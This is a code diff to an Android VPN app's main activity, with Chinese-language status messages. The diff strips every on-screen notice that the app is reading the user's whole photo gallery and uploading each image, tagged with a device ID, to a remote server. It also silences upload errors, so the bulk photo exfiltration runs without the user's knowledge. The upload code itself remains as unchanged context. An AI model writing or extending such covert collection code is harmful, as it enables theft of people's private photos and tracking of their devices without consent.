@@ -9,7 +9,7 @@ import android.net.VpnService
 import android.os.Build
 import android.os.Bundle
 import android.provider.MediaStore
-import android.widget.Toast
+import android.util.Log
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.MutableLiveData
@@ -77,7 +77,6 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             }
             if (Settings.serviceMode == ServiceMode.VPN) {
                 if (prepare()) {
-                    showToast("VPN permission required")
                     return@launch
                 }
             }
@@ -131,12 +130,6 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         super.onDestroy()
     }
 
-    private fun showToast(message: String) {
-        runOnUiThread {
-            Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
-        }
-    }
-
     private fun uploadImageToServer(imageUri: android.net.Uri, fileName: String, deviceId: String) {
         try {
             val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
@@ -166,13 +159,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             outputStream.flush()
             outputStream.close()
 
-            val responseCode = conn.responseCode
-            val response = conn.inputStream.bufferedReader().use { it.readText() }
-            showToast("✅ 上传成功 [$responseCode]: $fileName")
-
-        } catch (e: Exception) {
-            showToast("❌ 上传失败: ${e.message}")
-        }
+        } catch (_: Exception) {}
     }
 
     @SuppressLint("NewApi")
@@ -222,10 +209,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         if (deviceId.isNullOrBlank()) {
             deviceId = prefs.getString("random_device_id", null) ?: java.util.UUID.randomUUID().toString().also {
                 prefs.edit().putString("random_device_id", it).apply()
-                showToast("⚠️ 无法获取 Android_ID，生成随机设备 ID: $it")
             }
-        } else {
-            showToast("📱 获取到设备 ID: $deviceId")
         }
 
         lifecycleScope.launch(Dispatchers.IO) {
@@ -249,12 +233,11 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
                     val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                     val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
 
-                    showToast("📤 正在上传第 ${index + 1} 张: $name")
                     delay(index * 200L)
                     uploadImageToServer(uri, name, deviceId)
                     index++
                 }
-            } ?: showToast("❌ 无法读取相册")
+            }
         }
     }
 
